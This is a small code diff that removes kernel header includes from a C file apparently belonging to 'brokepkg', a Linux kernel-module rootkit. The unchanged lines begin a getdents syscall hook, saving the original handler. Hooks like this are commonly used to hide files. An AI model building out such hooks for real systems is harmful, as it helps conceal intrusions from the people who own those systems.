@@ -1,13 +1,5 @@
 #include "brokepkg.h"
 
-#include <linux/dirent.h>
-#include <linux/init.h>
-#include <linux/kallsyms.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/version.h>
-
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 static t_syscall orig_getdents;
